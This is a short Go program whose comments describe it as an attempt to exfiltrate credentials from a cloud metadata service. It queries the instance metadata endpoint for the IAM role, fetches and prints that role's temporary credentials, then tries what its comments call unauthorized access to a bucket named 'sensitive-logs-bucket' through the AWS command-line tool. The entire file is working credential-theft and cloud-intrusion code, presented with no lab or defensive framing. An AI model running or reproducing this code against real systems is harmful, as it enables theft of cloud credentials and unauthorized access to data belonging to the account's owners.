// main.go
package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os/exec"
)

func main() {
	// Attempt to exfiltrate creds from metadata service
	resp, err := http.Get("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
	if err != nil {
		fmt.Println("Could not reach metadata endpoint")
		return
	}
	defer resp.Body.Close()

	roleBytes, _ := ioutil.ReadAll(resp.Body)
	role := string(roleBytes)
	fmt.Println("Found role:", role)

	// Get credentials for role
	credsResp, err := http.Get("http://169.254.169.254/latest/meta-data/iam/security-credentials/" + role)
	if err == nil {
		body, _ := ioutil.ReadAll(credsResp.Body)
		fmt.Println("Creds:\n", string(body))
	}

	// Attempt unauthorized S3 access
	out, err := exec.Command("aws", "s3", "ls", "s3://sensitive-logs-bucket").CombinedOutput()
	if err != nil {
		fmt.Println("Access failed:", err)
	}
	fmt.Println(string(out))
}
